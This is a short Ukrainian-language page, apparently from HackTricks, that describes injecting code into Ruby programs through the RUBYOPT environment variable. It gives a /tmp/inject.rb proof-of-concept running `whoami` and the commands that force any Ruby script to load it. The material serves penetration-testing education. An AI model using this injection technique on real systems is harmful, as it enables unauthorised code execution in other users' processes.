# Ін'єкція Ruby Applications

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Використовуючи цю env variable, можна **додати нові параметри** до **ruby** щоразу, коли його запускають. Хоча параметр **`-e`** не можна використовувати для вказання ruby-коду для виконання, можна використати параметри **`-I`** і **`-r`**, щоб додати нову папку до шляху завантаження бібліотек, а потім **вказати бібліотеку для завантаження**.

Створіть бібліотеку **`inject.rb`** у **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Створіть будь-де Ruby-скрипт, наприклад:
```ruby:hello.rb
puts 'Hello, World!'
```
Потім змусьте довільний Ruby-скрипт завантажити його за допомогою:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Цікавий факт: це працює навіть із параметром **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
